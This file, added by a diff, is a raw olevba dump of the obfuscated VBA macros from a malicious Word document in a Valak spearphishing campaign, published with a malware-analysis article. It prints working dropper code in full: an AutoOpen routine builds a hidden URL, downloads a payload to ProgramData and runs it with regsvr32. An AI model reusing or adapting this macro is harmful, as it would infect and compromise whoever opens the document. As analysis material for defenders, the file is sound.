@@ -1,0 +1,260 @@
+# doc-vba-dump-raw.txt
+# Part of the following article: https://chris.partridge.tech/2020/anatomy-of-a-valak-distributing-email/the-campaign/
+# Published: June 1, 2020
+#
+# The raw VBA scripts included in a malicious .doc file as part of a Valak spearphishing campaign.
+# License: CC BY 2.0, ref: https://creativecommons.org/licenses/by/2.0/legalcode
+
+olevba 0.55.1 on Python 3.8.2 - http://decalage.info/python/oletools
+===============================================================================
+FILE: documents_05.20.doc
+Type: OpenXML
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO s.bas 
+in file: word/vbaProject.bin - OLE stream: 'VBA/s'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Function H()
+
+' Hs retailers undertakings sanity
+' Erica acrylic
+' Satellite craters relay
+' Collections detective biblical
+
+' Lo sharing
+' Moreover loyally pain
+' Concentric Word discharge view dvds
+
+' Frisky
+' Glossary pest
+' Dirk data
+' Portly thriving submissive ravens extremely all-powerful
+' Dynamite program detention
+' Adm. alibi
+' Vermont adobe slightly houses inclusion cosmos obsequious
+
+' Rhea cockade
+' Spice possibilities characteristics enquiry optimum
+' Jaguar egypt dollar ed weave
+' Pedagogue videos phosphoric
+' Bottles bids clear urge
+' Totality representatives gravity bandit loafer tenant
+
+' Harvest zip graham whore
+' License bulletin
+' Operating dangerous devonian huge joining
+' Drawback king sooty controller
+' Rocked routine
+' Reborn items notebook
+
+' Electrified pitchfork mit modify zero
+' Aides manipulation
+' Soviet shanty j forty-eight lady
+' Consistent eighty-seven
+' Electronic
+' Kay draughtsman
+' Temps paraguay kerry univ
+
+' Grandparents laundry nutter nec monitor
+' Retaliate dapper enforcement portent beside constraints
+' Pac christine
+
+' Affidavit rc faced
+' Expanding chronic unix
+' Premise godhead advertisers justin bbs
+' Immobile tea monica listings courts
+' Eaves half-moon literati saturn
+
+' Confused
+' Bigger opprobrious cod
+' Copy feof
+' Cassette spades elegantly deferential scud
+End Function
+Function k()
+
+' Lathe drab watches utils
+' Kinds jacobs advocacy
+' Yachts conspiracy hag chunk
+' Incidents writs
+Dim arr(8) As String
+' Nb language intentional paraffin
+' Developers duty revolve wagner
+arr(0) = "h100%t100%t100%p100%:100%/100%/100%p100%5100%7100%z100%u100%1100%p100%9100%b100%3100%a100%u100%2100%w100%6100%g100%h100%u100%.10"
+' Winnings licenses
+' Coat morris cleanup
+arr(1) = "0%c100%o100%m100%/100%u100%r100%v100%a100%v100%e100%/100%c100%e100%n100%n100%c100%.100%p100%h100%p100%?100%l100%=100%h100%a100%a"
+' Innkeeper
+' Swagger relaxation cajole mount asked tasting predicament mens
+' Physiological inoffensive autobiography illusory interpose ron
+arr(2) = "100%o100%9100%.100%c100%a100%b100%=100%=100%=100%=100%=100%c100%:100%\100%p100%r100%o100%g100%r100%a100%m100%d100%a100%t100%a100"
+' Berkeley mercantile participant unobtrusive literacy geology looksmart qui
+' Nw
+' Walnut nitrogen
+' Obligatory does
+arr(3) = "%\100%2100%6100%1100%6100%3100%5100%6100%3100%.100%d100%a100%t100%"
+
+' Modeling margot godless
+' Governance lucky prim
+k = arr
+End Function
+Function Ej(yH, H3)
+F1 = k
+
+' Tawdry nirvana apartments promulgation grinder ambrosia
+' Cc intercept friendly cst
+' Aqua
+' Individuals buried numerous grimace
+' Fortuitous above execution asbestos
+qY = Join(F1, "")
+
+' Ad bedding quantum cheyenne
+' Precipitation debian christopher connecticut
+' Prefecture agency
+qY = Replace(qY, yH, "")
+
+' Multiplication solutions freud
+' Camel cisco
+' Transportation mc odysseus electrified webcam towel conversations
+' Ascii slim turbulence congestion inverse abating is
+' Dipper discourage don easterly newcastle comport
+' Scudding
+' If madras ping
+F1 = Split(qY, "=====")
+
+' Flooring triple recognition rampant
+' Delhi
+' Simplified
+Select Case H3
+Case 0
+Ej = F1(0)
+Case 1
+Ej = F1(1)
+Case Else
+Debug.Print "qY"
+End Select
+End Function
+Sub AutoOpen()
+
+' Tft requirements fascinate
+' Facilities com urania
+' Disparaging garbage disprove vibrant aboriginal jade
+' Festive pcs dp jets
+' Karma
+' Admissible bereavement
+Dim Ka As New C
+
+' Organize william jubilation t
+' Pdf wales
+' Valise apparel cheap
+' Ensnare hypothesis servitor
+Ka.t Ej("100%", 0), Ej("100%", 1)
+
+' Costume funny
+' Encumber perturbation
+' Kazakhstan happening
+Dim XT As New r7
+
+' Inherited warm shift tobago
+' Untimely
+
+' Chippewa dictatorial clayey chocolate apathy footfall
+
+' Lang riverside petiole
+' Impurity billing lb
+' Veto mobile cravat
+' Stab earldom undeserving
+
+' Breastwork contamination
+' Organist
+' Nutshell drivers reilly
+' Tepee norman fount
+' Cabaret terminal
+Call XT.be("regsvr" & 32 & " " & Ej("100%", 1))
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO C.cls 
+in file: word/vbaProject.bin - OLE stream: 'VBA/C'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+#If VBA7 And Win64 Then
+Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
+Alias "URLDownloadToFileA" ( _
+ByVal pCaller As LongPtr, _
+ByVal szURL As String, _
+ByVal szFileName As String, _
+ByVal dwReserved As LongPtr, _
+ByVal lpfnCB As LongPtr _
+) As Long
+#Else
+Private Declare Function URLDownloadToFile Lib "urlmon" _
+Alias "URLDownloadToFileA" ( _
+ByVal pCaller As Long, _
+ByVal szURL As String, _
+ByVal szFileName As String, _
+ByVal dwReserved As Long, _
+ByVal lpfnCB As Long _
+) As Long
+#End If
+Private Sub Class_Initialize()
+
+' Cliff odoriferous melon nw
+' Mallet modified
+' Ruled alex arc rope
+End Sub
+Private Sub Class_Terminate()
+
+' Master
+' Assembling calcium ingress adjustable cossack
+' Abortion incredulity
+End Sub
+Public Sub t(vl, Jo)
+
+' Capital accusing rooms inversion interdict webcam
+' Tarts ignominy
+' Stun classroom
+
+' Unexpected nebuchadnezzar grandiose scandals
+' Trade hopkins thumping independently hockey
+' Flicker suns instantaneous
+URLDownloadToFile 0, vl, Jo, 0, 0
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO r7.cls 
+in file: word/vbaProject.bin - OLE stream: 'VBA/r7'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Function be(OB)
+
+' Hugo metropolitan attempting
+' Advert incl aimed invariable seminar lottery
+' Slavonic
+' Oftentimes betty facing couplet eds slide temporal
+Dim w7 As New WshShell
+w7.exec OB
+End Function
+Function E(Zh)
+    
+' His frequency por dining
+' Stickers registered them
+' Columns
+
+' Monica job
+' Usda fifty-five sufficiency ninety-six symmetrical
+' Hoar nude photograph carolina
+End Function
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+|Suspicious|exec                |May run an executable file or a system       |
+|          |                    |command using Excel 4 Macros (XLM/XLF)       |
+|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+|Suspicious|Lib                 |May run code from a DLL                      |
+|Suspicious|URLDownloadToFileA  |May download files from the Internet         |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
++----------+--------------------+---------------------------------------------+
+
